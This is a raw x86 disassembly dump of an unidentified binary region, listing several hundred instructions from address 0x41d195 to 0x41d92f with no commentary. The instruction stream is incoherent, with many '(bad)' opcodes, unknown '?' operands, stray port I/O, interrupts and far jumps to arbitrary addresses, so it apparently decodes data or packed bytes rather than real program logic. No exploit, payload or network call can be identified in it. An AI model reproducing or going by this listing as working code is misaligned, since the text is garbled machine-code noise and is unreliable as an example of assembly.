  41d195:	and    ebx,DWORD PTR [eax+0x79816d22]
  41d19b:	loop   0x41d1aa
  41d19d:	loope  0x41d1f2
  41d19f:	push   edi
  41d1a0:	loop   0x41d1d3
  41d1a2:	lea    esp,[ebx]
  41d1a4:	dec    esi
  41d1a5:	jns    0x41d193
  41d1a7:	adc    DWORD PTR [edi+0x77ffb089],0x35
  41d1ae:	jae    0x41d1dd
  41d1b0:	and    cl,BYTE PTR [ebx-0x64a9321e]
  41d1b6:	and    BYTE PTR [edx+0x54710180],bh
  41d1bc:	cmp    ebx,DWORD PTR ds:0xd7047c88
  41d1c2:	or     ebp,DWORD PTR [ebx]
  41d1c4:	cmp    DWORD PTR [edi],ecx
  41d1c6:	jp     0x41d1a1
  41d1c8:	or     al,BYTE PTR [ebx+0x3999f6ff]
  41d1ce:	lea    eax,[edi-0x31ce40af]
  41d1d4:	fsub   st,st(3)
  41d1d6:	ins    BYTE PTR es:[edi],dx
  41d1d7:	cwde   
  41d1d8:	pop    ebx
  41d1d9:	mov    DWORD PTR [ecx+0x325c9ae6],ebp
  41d1df:	and    DWORD PTR [edi+0x47],ebp
  41d1e2:	push   0xf
  41d1e4:	inc    edi
  41d1e5:	jge    0x41d1cb
  41d1e7:	fcmovnu st,st(4)
  41d1e9:	fiadd  DWORD PTR [ecx-0x6ae63fde]
  41d1ef:	adc    DWORD PTR [ecx+0x43cb3855],0xffffffcf
  41d1f6:	and    ebx,DWORD PTR [ebx-0x629ae7ad]
  41d1fc:	xor    ah,BYTE PTR [ecx-0x2d8c807e]
  41d202:	fadd   st(4),st
  41d204:	cwde   
  41d205:	jg     0x41d203
  41d207:	cld    
  41d208:	je     0x41d194
  41d20a:	inc    edi
  41d20b:	sub    DWORD PTR [eax],ebp
  41d20d:	sbb    al,0x1a
  41d20f:	or     ebx,eax
  41d211:	add    BYTE PTR ds:0xeebe57dd,al
  41d217:	fs data16 in al,dx
  41d21a:	mov    cl,0xf6
  41d21c:	inc    esi
  41d21d:	add    eax,DWORD PTR [ebx]
  41d21f:	int    0xd7
  41d221:	jmp    0x1b5f:0xfa369256
  41d228:	mov    ds:0x1dde1652,al
  41d22d:	xor    al,BYTE PTR [edi+eiz*2]
  41d230:	jg     0x41d1cc
  41d232:	pop    esp
  41d233:	or     al,0xc2
  41d235:	and    al,0x66
  41d237:	ins    BYTE PTR es:[edi],dx
  41d238:	or     edx,DWORD PTR [edx+eax*8]
  41d23b:	jno    0x41d272
  41d23d:	dec    eax
  41d23e:	fbstp  TBYTE PTR [ebp+ebp*8+0x7c]
  41d242:	addr16 dec esp
  41d244:	jne    0x41d205
  41d246:	ret    0x6dbf
  41d249:	push   ebx
  41d24a:	pop    ds
  41d24b:	mov    cs,WORD PTR [ebx]
  41d24d:	add    ebx,ebp
  41d24f:	cmp    ebp,DWORD PTR [ebp-0x737c2dd6]
  41d255:	icebp  
  41d256:	clc    
  41d257:	test   DWORD PTR [eax-0x54007f16],esp
  41d25d:	xor    al,0x20
  41d25f:	push   0x32
  41d261:	cmp    al,0x8b
  41d263:	call   0x77408391
  41d268:	aaa    
  41d269:	test   DWORD PTR [eax+0x24],0xf0ff6363
  41d270:	mov    ds:0x70b990b,eax
  41d275:	jle    0x41d2eb
  41d277:	scas   eax,DWORD PTR es:[edi]
  41d278:	into   
  41d279:	imul   DWORD PTR [esi+0x1f5cfff1]
  41d27f:	mov    ecx,0xce2296f0
  41d284:	icebp  
  41d285:	(bad)
  41d289:	rcl    DWORD PTR [ecx+0x13],cl
  41d28c:	fwait
  41d28d:	retf   0xe284
  41d290:	mov    ebx,db7
  41d293:	and    al,BYTE PTR [esi+0x37]
  41d296:	cmp    BYTE PTR [esi+0x256ec0f6],ch
  41d29c:	push   ds
  41d29d:	mov    cl,0xb7
  41d29f:	cs aam 0xa3
  41d2a2:	xor    BYTE PTR [ebp+0xa],0xc3
  41d2a6:	stos   BYTE PTR es:[edi],al
  41d2a7:	pop    ecx
  41d2a8:	int    0xe
  41d2aa:	imul   bh
  41d2ac:	imul   eax,DWORD PTR [ebx+0x14fc87e4],0x6d
  41d2b3:	out    0x6e,al
  41d2b5:	scas   al,BYTE PTR es:[edi]
  41d2b6:	ds aas 
  41d2b8:	pusha  
  41d2b9:	idiv   DWORD PTR [edi+0x640565c9]
  41d2bf:	jae    0x41d300
  41d2c1:	xor    eax,0x9de75c79
  41d2c6:	int3   
  41d2c7:	sub    edi,edi
  41d2c9:	inc    edx
  41d2ca:	cdq    
  41d2cb:	out    0xc1,eax
  41d2cd:	adc    eax,0x71be1371
  41d2d2:	xor    eax,0x47fbdfec
  41d2d7:	or     eax,0x15fa069f
  41d2dc:	mov    ecx,0x5b325989
  41d2e1:	fidivr WORD PTR [ebx-0x5a]
  41d2e4:	mov    DWORD PTR [ebp+0x4c],0xdaafd582
  41d2eb:	adc    eax,0x23470671
  41d2f0:	rol    DWORD PTR fs:0x275160a8,0x96
  41d2f8:	inc    esi
  41d2f9:	inc    ecx
  41d2fa:	jmp    0x41d27f
  41d2fc:	sahf   
  41d2fd:	xchg   esp,eax
  41d2fe:	lahf   
  41d2ff:	mov    edi,0x9ef29ef7
  41d304:	sbb    eax,0xf37ce5a9
  41d309:	pop    edi
  41d30a:	sbb    al,0x16
  41d30c:	in     al,0x4f
  41d30e:	mov    al,0x77
  41d310:	arpl   bp,sp
  41d312:	pop    ebx
  41d313:	cwde   
  41d314:	sahf   
  41d315:	call   0x7cb5647f
  41d31a:	pop    ss
  41d31b:	popf   
  41d31c:	inc    eax
  41d31d:	test   eax,0x1d108d10
  41d322:	scas   al,BYTE PTR es:[edi]
  41d323:	jmp    0x41d39e
  41d325:	pusha  
  41d326:	ss or  eax,0x727de6e9
  41d32c:	cmp    eax,0x3c6d0c6a
  41d331:	add    esp,DWORD PTR [esi+0x2244b79a]
  41d337:	push   ss
  41d338:	adc    esp,eax
  41d33a:	xor    BYTE PTR ds:[eax-0x6c713f62],ch
  41d341:	push   edx
  41d342:	imul   DWORD PTR ds:0x1296afac
  41d348:	(bad)  
  41d349:	jmp    0xbaf0a26e
  41d34e:	xor    eax,0xe7d86428
  41d353:	mov    eax,0x6b76753
  41d358:	inc    eax
  41d359:	js     0x41d3b9
  41d35b:	les    ebx,FWORD PTR ds:0x74bba8fb
  41d361:	repnz sub ah,0x90
  41d365:	pop    edx
  41d366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d367:	cli    
  41d368:	mov    dl,0x77
  41d36a:	scas   al,BYTE PTR es:[edi]
  41d36b:	je     0x41d3aa
  41d36d:	gs pop esp
  41d36f:	shl    BYTE PTR [esi-0x20],cl
  41d372:	mov    ecx,DWORD PTR [esi+esi*1+0x0]
  41d376:	(bad)  
  41d377:	pop    edi
  41d378:	mov    edx,0x3a922d9e
  41d37d:	xchg   esi,eax
  41d37e:	cld    
  41d37f:	mov    dl,0x45
  41d381:	pushf  
  41d382:	jge    0x41d3c7
  41d384:	lock push ebp
  41d386:	mov    eax,0x7233a8d7
  41d38b:	sbb    eax,0x852c66da
  41d390:	sub    DWORD PTR [ecx+0x34],ecx
  41d393:	inc    eax
  41d394:	inc    ecx
  41d395:	in     al,0xcd
  41d397:	dec    eax
  41d398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d399:	jae    0x41d342
  41d39b:	leave  
  41d39c:	jl     0x41d32c
  41d39e:	dec    edi
  41d39f:	adc    cl,bl
  41d3a1:	mov    al,ds:0xea85a022
  41d3a6:	mov    edi,0x7cb43902
  41d3ab:	xor    eax,0xe3ddcfe2
  41d3b0:	mov    bl,0x9d
  41d3b2:	aaa    
  41d3b3:	sub    eax,0xa657a9a
  41d3b8:	mov    BYTE PTR [ecx+0x7f55a141],0xf2
  41d3bf:	ss jae 0x41d3bd
  41d3c2:	in     eax,dx
  41d3c3:	cmp    DWORD PTR [eax-0xaf20deb],eax
  41d3c9:	adc    BYTE PTR [esi-0x90be8df],bh
  41d3cf:	in     al,0x44
  41d3d1:	push   cs
  41d3d2:	into   
  41d3d3:	pop    edx
  41d3d4:	mov    DWORD PTR [ebp+0x36c1b54],ebx
  41d3da:	fist   DWORD PTR [bp+si+0x6321]
  41d3df:	add    eax,DWORD PTR [edi]
  41d3e1:	pop    ebp
  41d3e2:	outs   dx,BYTE PTR ds:[esi]
  41d3e3:	shl    BYTE PTR [esi-0x5],1
  41d3e6:	push   es
  41d3e7:	and    BYTE PTR [ebx-0x6930550d],cl
  41d3ed:	add    al,0x46
  41d3ef:	(bad)  
  41d3f0:	lahf   
  41d3f1:	xchg   edx,eax
  41d3f2:	sar    DWORD PTR [esi],1
  41d3f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3f5:	sbb    al,0xb
  41d3f7:	pop    ss
  41d3f8:	jbe    0x41d457
  41d3fa:	push   ecx
  41d3fb:	xor    cl,ah
  41d3fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3fe:	lock xchg edi,eax
  41d400:	nop
  41d401:	xchg   edx,eax
  41d402:	inc    DWORD PTR [edx+edx*8]
  41d405:	push   ebx
  41d406:	das    
  41d407:	xchg   edi,eax
  41d408:	inc    ecx
  41d409:	outs   dx,BYTE PTR ds:[esi]
  41d40a:	mov    ds,WORD PTR [ebp-0x7b]
  41d40d:	pop    edi
  41d40e:	mov    WORD PTR [ebx+0x7c],es
  41d411:	stos   BYTE PTR es:[edi],al
  41d412:	fs loopne 0x41d455
  41d415:	xchg   ebx,eax
  41d416:	fmul   DWORD PTR [edx+0x6649a312]
  41d41c:	jmp    FWORD PTR [ebx-0x4a]
  41d41f:	jmp    DWORD PTR [ebx]
  41d421:	sub    ch,ch
  41d423:	xor    DWORD PTR [ebp-0x102e58a3],0xffffffdc
  41d42a:	add    DWORD PTR [esi+0x4cc28b04],0x44ad451c
  41d434:	gs and eax,0x55303c8c
  41d43a:	imul   edx,esi,0x2d031d02
  41d440:	out    0xcc,al
  41d442:	das    
  41d443:	and    BYTE PTR [ecx-0x4f7f5bb],al
  41d449:	fsubp  st(3),st
  41d44b:	adc    al,0x76
  41d44d:	test   al,0xfd
  41d44f:	xor    al,0x3b
  41d451:	stos   BYTE PTR es:[edi],al
  41d452:	sub    al,0xca
  41d454:	jmp    0x1bc4:0x2ee6d717
  41d45b:	das    
  41d45c:	fcmovb st,st(5)
  41d45e:	pushf  
  41d45f:	repnz pop edx
  41d461:	mov    ecx,0x952467b3
  41d466:	arpl   WORD PTR [esi+0x79],ax
  41d469:	(bad)  
  41d46a:	imul   ecx,DWORD PTR [edx-0xb],0xb89097e4
  41d471:	sub    bl,ah
  41d473:	in     al,dx
  41d474:	jae    0x41d407
  41d476:	arpl   WORD PTR [ecx+0x58e9c31a],ax
  41d47c:	adc    esi,DWORD PTR [edi]
  41d47e:	inc    esp
  41d47f:	pop    esp
  41d480:	stc    
  41d481:	cmp    eax,0x884fe335
  41d486:	xor    DWORD PTR [eax+0xf1ff116],esi
  41d48c:	mov    BYTE PTR [esi-0x56],dh
  41d48f:	fisub  DWORD PTR ds:0x8070fde1
  41d495:	push   ebx
  41d496:	sbb    DWORD PTR [eax],edi
  41d498:	sub    DWORD PTR [edi-0x7b],edi
  41d49b:	ret    
  41d49c:	pop    ebp
  41d49d:	mov    ecx,0x29c7a76d
  41d4a2:	or     eax,0x81f8aaa7
  41d4a7:	mov    dh,0xa6
  41d4a9:	xor    al,ah
  41d4ab:	pop    esp
  41d4ac:	icebp  
  41d4ad:	sub    dl,bh
  41d4af:	adc    dl,BYTE PTR [edi]
  41d4b1:	dec    eax
  41d4b2:	adc    DWORD PTR [edi],eax
  41d4b4:	sub    eax,0x6ab2aed5
  41d4b9:	inc    ebx
  41d4ba:	rcr    esi,0x47
  41d4bd:	cmp    bl,BYTE PTR [esi+0x6e]
  41d4c0:	add    al,0x35
  41d4c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4c3:	sbb    al,0xfc
  41d4c5:	mov    al,ds:0x1a69868f
  41d4ca:	xchg   edi,edx
  41d4cc:	loopne 0x41d50b
  41d4ce:	xchg   esp,eax
  41d4cf:	iret   
  41d4d0:	fisub  DWORD PTR [ecx-0x3afd2524]
  41d4d6:	pop    ecx
  41d4d7:	into   
  41d4d8:	out    0x28,al
  41d4da:	leave  
  41d4db:	nop
  41d4dc:	sti    
  41d4dd:	adc    BYTE PTR [edx+eiz*4-0x3bca96f7],0x43
  41d4e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4e6:	loop   0x41d484
  41d4e8:	mov    eax,ds:0x9f72a147
  41d4ed:	retf   
  41d4ee:	sbb    al,0xf6
  41d4f0:	in     eax,dx
  41d4f1:	stc    
  41d4f2:	dec    esi
  41d4f3:	sub    eax,0x646a1434
  41d4f8:	bound  eax,QWORD PTR [esi*2-0x1d5d00fa]
  41d4ff:	sbb    DWORD PTR [esi],eax
  41d501:	pushf  
  41d502:	aam    0x28
  41d504:	pop    ebp
  41d505:	ins    BYTE PTR es:[edi],dx
  41d506:	sbb    DWORD PTR [edi],ecx
  41d508:	rol    DWORD PTR [eax+0x1b],cl
  41d50b:	cs push ds
  41d50d:	and    BYTE PTR [ebp-0x6],0xcd
  41d511:	inc    ecx
  41d512:	push   ds
  41d513:	aad    0xad
  41d515:	jne    0x41d525
  41d517:	jo     0x41d4f6
  41d519:	int3   
  41d51a:	sub    DWORD PTR [ebx+0x6823b56e],ebx
  41d520:	icebp  
  41d521:	mov    edx,0xd5fd91bd
  41d526:	pop    ecx
  41d527:	xor    cl,bh
  41d529:	jne    0x41d594
  41d52b:	push   edx
  41d52c:	cmc    
  41d52d:	int    0xc5
  41d52f:	jecxz  0x41d4e9
  41d531:	ins    DWORD PTR es:[edi],dx
  41d532:	ror    BYTE PTR cs:[edi+edi*1+0x17],0xc6
  41d538:	xor    al,0x49
  41d53a:	push   ds
  41d53b:	retf   
  41d53c:	jns    0x41d5ae
  41d53e:	clc    
  41d53f:	xor    dh,BYTE PTR [ecx]
  41d541:	out    dx,eax
  41d542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d543:	mov    dl,0x43
  41d545:	jmp    0xe34c6aa1
  41d54a:	fcomp  st(6)
  41d54c:	clc    
  41d54d:	popf   
  41d54e:	dec    esp
  41d54f:	sbb    al,0xde
  41d551:	inc    edx
  41d552:	cmp    bl,BYTE PTR [edx+0x67d2207e]
  41d558:	adc    eax,0xc114a938
  41d55d:	sub    esi,DWORD PTR [ebx-0x2044027e]
  41d563:	jb     0x41d58e
  41d565:	out    0x3e,eax
  41d567:	xor    ebx,0xa988ec8c
  41d56d:	add    DWORD PTR [edi],edi
  41d56f:	or     ah,BYTE PTR [edx+0x9]
  41d572:	sub    bl,BYTE PTR [ebp+eax*2-0x2dd5a89c]
  41d579:	shl    BYTE PTR [ebx+edx*2+0x12],cl
  41d57d:	shl    DWORD PTR [esi+0x7a48ccc5],cl
  41d583:	and    BYTE PTR [ecx+0x15],ah
  41d586:	push   es
  41d587:	in     eax,dx
  41d588:	aam    0xde
  41d58a:	xor    BYTE PTR [edi],0xfa
  41d58d:	lahf   
  41d58e:	mov    ch,0xf9
  41d590:	dec    edx
  41d591:	dec    eax
  41d592:	xchg   ebx,eax
  41d593:	mov    ds:0xc36d2337,eax
  41d598:	jle    0x41d569
  41d59a:	fbld   TBYTE PTR [edx+eiz*2+0x546e69a7]
  41d5a1:	jmp    0xb9ea:0x8e6b208d
  41d5a8:	sahf   
  41d5a9:	jns    0x41d566
  41d5ab:	into   
  41d5ac:	jle    0x41d589
  41d5ae:	sbb    bl,BYTE PTR [eax+0x342b62a8]
  41d5b4:	pop    ecx
  41d5b5:	push   ecx
  41d5b6:	jge    0x41d57c
  41d5b8:	or     dl,BYTE PTR ds:0x4f8a0615
  41d5be:	int3   
  41d5bf:	mov    ah,0xcf
  41d5c1:	stc    
  41d5c2:	cmovl  edi,DWORD PTR [ebx+0x6f]
  41d5c6:	xchg   edi,eax
  41d5c7:	std    
  41d5c8:	or     bh,BYTE PTR [edx+ebx*4-0x10]
  41d5cc:	jb     0x41d618
  41d5ce:	in     al,dx
  41d5cf:	cdq    
  41d5d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5d1:	aas    
  41d5d2:	cmp    DWORD PTR [ebx-0x38],0x25a5770d
  41d5d9:	xchg   DWORD PTR [ebx+ebp*4],edi
  41d5dc:	shl    DWORD PTR [edi-0x7d9057c6],0xde
  41d5e3:	xlat   BYTE PTR ds:[ebx]
  41d5e4:	loop   0x41d664
  41d5e6:	mov    ebp,0x4d08994e
  41d5eb:	mov    edx,0xff8b695f
  41d5f0:	lahf   
  41d5f1:	cmp    BYTE PTR [edx-0x1f],ah
  41d5f4:	mov    dl,0xba
  41d5f6:	es mov edx,0x96c5a4e5
  41d5fc:	retf   0x9e5
  41d5ff:	xchg   ebx,eax
  41d600:	mov    bh,0xde
  41d602:	mov    ?,WORD PTR [ebp-0x2d6e4dc7]
  41d608:	(bad)  
  41d609:	mov    WORD PTR [esi+esi*2+0x61],?
  41d60d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d60e:	xchg   ebp,eax
  41d60f:	rcr    BYTE PTR [edx],1
  41d611:	and    ebp,DWORD PTR [edx+edx*4]
  41d614:	xchg   edx,eax
  41d615:	scas   al,BYTE PTR es:[edi]
  41d616:	xchg   edi,eax
  41d617:	enter  0x6489,0xaa
  41d61b:	sub    eax,0xc9f61398
  41d620:	mov    esi,0x5280a945
  41d625:	xor    edi,edx
  41d627:	das    
  41d628:	(bad)  
  41d629:	pop    esi
  41d62a:	pop    ecx
  41d62b:	mov    ?,edx
  41d62d:	arpl   WORD PTR [edi-0x1be6cea2],dx
  41d633:	scas   al,BYTE PTR es:[edi]
  41d634:	sbb    dh,BYTE PTR [edx]
  41d636:	push   ecx
  41d637:	fidivr DWORD PTR [ebx]
  41d639:	test   DWORD PTR [edx-0x5731999b],esp
  41d63f:	push   0xffffffee
  41d641:	(bad)  
  41d642:	cmp    ah,BYTE PTR [eax]
  41d644:	mov    dl,0x86
  41d646:	mov    esp,0x9586883
  41d64b:	out    0x52,al
  41d64d:	push   ss
  41d64e:	xor    BYTE PTR [ebp-0xb936858],0xdf
  41d655:	mov    al,ds:0x6215d15c
  41d65a:	(bad)  
  41d65b:	mov    ds:0xf935f053,al
  41d660:	pushf  
  41d661:	ror    BYTE PTR ds:0x481b3424,1
  41d667:	lea    edi,[eax-0x66]
  41d66a:	ja     0x41d677
  41d66c:	xchg   ah,bl
  41d66e:	loop   0x41d609
  41d670:	sbb    DWORD PTR [ebx-0x5d1179a],esp
  41d676:	inc    ebp
  41d677:	mov    edx,0xf371875f
  41d67c:	adc    dl,BYTE PTR [eax-0x2]
  41d67f:	std    
  41d680:	jmp    DWORD PTR [ebx+0x49c03b19]
  41d686:	cli    
  41d687:	repnz cli 
  41d689:	dec    edi
  41d68a:	push   ecx
  41d68b:	into   
  41d68c:	sahf   
  41d68d:	and    ch,ch
  41d68f:	inc    edi
  41d690:	xor    ah,dh
  41d692:	(bad)  
  41d693:	fcmovnu st,st(0)
  41d695:	jmp    0x1a6b:0x105b8178
  41d69c:	dec    al
  41d69e:	mov    ecx,0x95a8a325
  41d6a3:	or     eax,0xcace7b
  41d6a8:	adc    al,BYTE PTR [eax+0x1f]
  41d6ab:	mov    bl,0x82
  41d6ad:	add    bl,BYTE PTR [edi+0x4b5ea820]
  41d6b3:	sbb    BYTE PTR [eax+0x27eff8ee],dl
  41d6b9:	jnp    0x41d703
  41d6bb:	or     al,0x6a
  41d6bd:	mov    esp,edx
  41d6bf:	jno    0x41d704
  41d6c1:	inc    edx
  41d6c2:	retf   
  41d6c3:	inc    esp
  41d6c4:	dec    ecx
  41d6c5:	lods   eax,DWORD PTR ds:[esi]
  41d6c6:	adc    DWORD PTR [ecx],edx
  41d6c8:	cmp    bh,BYTE PTR [ecx+0x21e4cc05]
  41d6ce:	push   esi
  41d6cf:	cmp    DWORD PTR [ecx+ebp*8+0x8],eax
  41d6d3:	push   es
  41d6d4:	xor    edi,DWORD PTR ds:0x81d0e9df
  41d6da:	jbe    0x41d74e
  41d6dc:	jmp    0x24a0cadf
  41d6e1:	xor    BYTE PTR [esi-0x7373ca80],ah
  41d6e7:	hlt    
  41d6e8:	mov    DWORD PTR [ecx+eiz*8+0x78],ecx
  41d6ec:	or     DWORD PTR [ecx-0x6d2cf22e],eax
  41d6f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6f3:	inc    ebx
  41d6f4:	add    ebp,DWORD PTR [eax-0x7dd896e2]
  41d6fa:	or     al,0xee
  41d6fc:	cmc    
  41d6fd:	sti    
  41d6fe:	dec    ebx
  41d6ff:	and    eax,0xadc1af4f
  41d704:	lea    esi,[edi-0x22]
  41d707:	repz jae 0x41d771
  41d70a:	push   0xd4b705f5
  41d70f:	fiadd  DWORD PTR [ecx+0x4efe605c]
  41d715:	add    BYTE PTR [eax-0x758942ab],dh
  41d71b:	adc    al,0x37
  41d71d:	out    dx,eax
  41d71e:	pop    esp
  41d71f:	push   eax
  41d720:	jle    0x41d6cf
  41d722:	iret   
  41d723:	sbb    bl,BYTE PTR [eiz*2-0x38a2d1f0]
  41d72a:	add    eax,0x23161276
  41d72f:	cmp    BYTE PTR [eax],al
  41d731:	scas   al,BYTE PTR es:[edi]
  41d732:	add    al,BYTE PTR [esi+0x34623095]
  41d738:	mov    esi,0x2410405c
  41d73d:	pop    es
  41d73e:	jg     0x41d7bb
  41d740:	and    BYTE PTR [edx],bl
  41d742:	retf   
  41d743:	add    DWORD PTR [ecx-0x4d],edx
  41d746:	push   ss
  41d747:	fidiv  DWORD PTR [ebx-0x5]
  41d74a:	adc    BYTE PTR [ecx],bl
  41d74c:	das    
  41d74d:	jbe    0x41d725
  41d74f:	dec    edx
  41d750:	rcl    BYTE PTR [edi],cl
  41d752:	jmp    FWORD PTR [esi]
  41d754:	(bad)  
  41d755:	div    edi
  41d757:	and    esi,DWORD PTR [eax]
  41d759:	push   esi
  41d75a:	xor    BYTE PTR [eax-0x52],0xb0
  41d75e:	call   0xeb5405f5
  41d763:	mov    al,0xc0
  41d765:	in     al,0xf2
  41d767:	jns    0x41d751
  41d769:	and    al,0x42
  41d76b:	xchg   BYTE PTR [eax+0x2f],dh
  41d76e:	cmp    eax,0xfd3fbc33
  41d773:	push   edi
  41d774:	(bad)  
  41d776:	pop    ds
  41d777:	fbld   TBYTE PTR ds:0x37dc084e
  41d77d:	in     eax,dx
  41d77e:	jbe    0x41d7a4
  41d780:	shl    DWORD PTR [edi-0xc81a650],cl
  41d786:	pop    edi
  41d787:	in     al,dx
  41d788:	mov    bl,0x1b
  41d78a:	adc    al,0x9d
  41d78c:	jle    0x41d779
  41d78e:	jmp    0x41d76c
  41d790:	lahf   
  41d791:	into   
  41d792:	mov    ecx,0xb6b1ba7e
  41d797:	les    edx,FWORD PTR [edi+0x41]
  41d79a:	push   ebx
  41d79b:	jnp    0x41d758
  41d79d:	xchg   edx,eax
  41d79e:	mov    bl,al
  41d7a0:	jno    0x41d816
  41d7a2:	imul   esi,DWORD PTR [eax+0x3e],0xcf8c4cf9
  41d7a9:	fcmove st,st(5)
  41d7ab:	and    BYTE PTR gs:[ebx+0x100483f6],0xc9
  41d7b3:	push   es
  41d7b4:	pushf  
  41d7b5:	jmp    0x521027bc
  41d7ba:	les    ecx,FWORD PTR [eax-0x228bcb91]
  41d7c0:	inc    ecx
  41d7c1:	lahf   
  41d7c2:	ins    DWORD PTR es:[edi],dx
  41d7c3:	loopne 0x41d82f
  41d7c5:	std    
  41d7c6:	sbb    DWORD PTR [ebp-0x741e3668],esp
  41d7cc:	dec    edi
  41d7cd:	jo     0x41d773
  41d7cf:	(bad)  
  41d7d0:	div    esp
  41d7d2:	fstp   QWORD PTR [edx+0x712386f2]
  41d7d8:	ds push ss
  41d7da:	out    dx,eax
  41d7db:	mov    bh,0xe7
  41d7dd:	das    
  41d7de:	(bad)  
  41d7df:	push   0xffffffad
  41d7e1:	push   ebx
  41d7e2:	aaa    
  41d7e3:	dec    eax
  41d7e4:	jnp    0x41d7a8
  41d7e6:	sbb    cl,BYTE PTR [edi+ebp*2]
  41d7e9:	push   ss
  41d7ea:	xchg   edx,eax
  41d7eb:	xor    ebp,DWORD PTR [esi+0x1d]
  41d7ee:	shl    edi,cl
  41d7f0:	arpl   WORD PTR [esp+esi*2],ax
  41d7f3:	jbe    0x41d7a0
  41d7f5:	or     edi,DWORD PTR ds:0x87a4ab36
  41d7fb:	sbb    DWORD PTR [edx+0x7eaf588e],ebx
  41d801:	mov    ch,0x25
  41d803:	inc    esi
  41d804:	xchg   ebp,eax
  41d805:	mov    al,ds:0x150c78f5
  41d80a:	xchg   ecx,eax
  41d80b:	xchg   esp,eax
  41d80c:	outs   dx,BYTE PTR ds:[esi]
  41d80d:	loop   0x41d7fd
  41d80f:	(bad)  
  41d810:	(bad)  
  41d811:	in     al,0x79
  41d813:	inc    ecx
  41d814:	stos   DWORD PTR es:[edi],eax
  41d815:	mov    ch,0x72
  41d817:	sub    ecx,DWORD PTR [edx]
  41d819:	mov    dh,0xda
  41d81b:	mov    ecx,0xeca1f17f
  41d820:	sbb    ebp,DWORD PTR ds:[ebx+0x3e]
  41d824:	dec    edx
  41d825:	das    
  41d826:	mov    ds:0x1ccea45c,eax
  41d82b:	icebp  
  41d82c:	rcr    BYTE PTR [esp+edx*1+0x4b329d15],0x14
  41d834:	or     ebx,DWORD PTR [ebp-0xff7dc41]
  41d83a:	push   0x12106c38
  41d83f:	aas    
  41d840:	push   ecx
  41d841:	cmc    
  41d842:	or     esi,DWORD PTR [ecx+0x1955a6a]
  41d848:	(bad)  
  41d849:	shl    DWORD PTR [edx],1
  41d84b:	out    0x32,al
  41d84d:	mov    ch,0xf8
  41d84f:	lock add ecx,DWORD PTR [eax]
  41d852:	cmp    eax,0x62dd6b82
  41d857:	xchg   edx,eax
  41d858:	mov    edi,0x35335f01
  41d85d:	xchg   ecx,eax
  41d85e:	ss sti 
  41d860:	out    0xcf,al
  41d862:	into   
  41d863:	push   cs
  41d864:	inc    esp
  41d865:	inc    ebx
  41d866:	cli    
  41d867:	adc    esi,DWORD PTR [eax+0x3827ae58]
  41d86d:	pusha  
  41d86e:	sub    al,0xf9
  41d870:	aam    0xb4
  41d872:	pop    edi
  41d873:	in     eax,dx
  41d874:	xchg   DWORD PTR [esi-0x5d],ebx
  41d877:	inc    edi
  41d878:	mov    ah,BYTE PTR [ebp+0x3914aee8]
  41d87e:	sbb    DWORD PTR [edi+edi*1],esp
  41d881:	stos   BYTE PTR es:[edi],al
  41d882:	add    BYTE PTR [ecx+0x70005d21],al
  41d888:	sbb    ecx,DWORD PTR [edi+ecx*8-0x2136d8cf]
  41d88f:	cmp    dl,ch
  41d891:	pop    ebp
  41d892:	into   
  41d893:	jbe    0x41d8b9
  41d895:	mov    DWORD PTR [edx+0x50],edi
  41d898:	sbb    eax,0x5e2338e1
  41d89d:	mov    eax,0x2cad1b2c
  41d8a2:	push   esi
  41d8a3:	mov    dh,0x59
  41d8a5:	xor    ebp,esp
  41d8a7:	repz into 
  41d8a9:	fwait
  41d8aa:	and    eax,0x2eb89398
  41d8af:	mul    DWORD PTR [ebp-0xf]
  41d8b2:	xor    ebp,ecx
  41d8b4:	add    DWORD PTR [edi-0x71],edi
  41d8b7:	add    cl,BYTE PTR ds:0xc344d727
  41d8bd:	xchg   esi,eax
  41d8be:	rol    BYTE PTR [ecx-0x1e52c859],0x3f
  41d8c5:	nop
  41d8c6:	je     0x41d939
  41d8c8:	push   edx
  41d8c9:	scas   al,BYTE PTR es:[edi]
  41d8ca:	dec    ebp
  41d8cb:	sub    bl,cl
  41d8cd:	sahf   
  41d8ce:	dec    ebx
  41d8cf:	inc    eax
  41d8d0:	aad    0x4d
  41d8d2:	sbb    esi,DWORD PTR [ebx]
  41d8d4:	push   ebx
  41d8d5:	xchg   edx,eax
  41d8d6:	sub    ebx,DWORD PTR [ebp-0x62f40a82]
  41d8dc:	out    dx,eax
  41d8dd:	pop    es
  41d8de:	push   cs
  41d8df:	daa    
  41d8e0:	add    al,0xd7
  41d8e2:	shr    DWORD PTR [eax],cl
  41d8e4:	aad    0x6d
  41d8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8e7:	push   0x8aa8bf7d
  41d8ec:	cli    
  41d8ed:	outs   dx,BYTE PTR gs:[esi]
  41d8ef:	adc    dh,BYTE PTR [edi]
  41d8f1:	sbb    edi,DWORD PTR [edx]
  41d8f3:	jg     0x41d929
  41d8f5:	fs push esp
  41d8f7:	sbb    DWORD PTR [ebx-0x70499488],0x67
  41d8fe:	retf   
  41d8ff:	and    al,0x73
  41d901:	or     al,BYTE PTR [eax]
  41d903:	mov    ?,WORD PTR [edx-0x3d]
  41d906:	pop    edx
  41d907:	jae    0x41d965
  41d909:	or     BYTE PTR [esi+0x6],ch
  41d90c:	dec    ecx
  41d90d:	je     0x41d96c
  41d90f:	xchg   edi,eax
  41d910:	xor    BYTE PTR [ecx],ah
  41d912:	pop    ds
  41d913:	pop    edi
  41d914:	add    al,0xd2
  41d916:	add    BYTE PTR [ecx-0x30822bb],dh
  41d91c:	loopne 0x41d918
  41d91e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d91f:	fild   QWORD PTR [eax+0x5f4379e8]
  41d925:	cmp    ch,BYTE PTR [ecx+0x3c]
  41d928:	fcomp  DWORD PTR [edx+eax*4]
  41d92b:	push   cs
  41d92c:	in     eax,dx
  41d92d:	js     0x41d8c3
  41d92f:	in     eax,dx
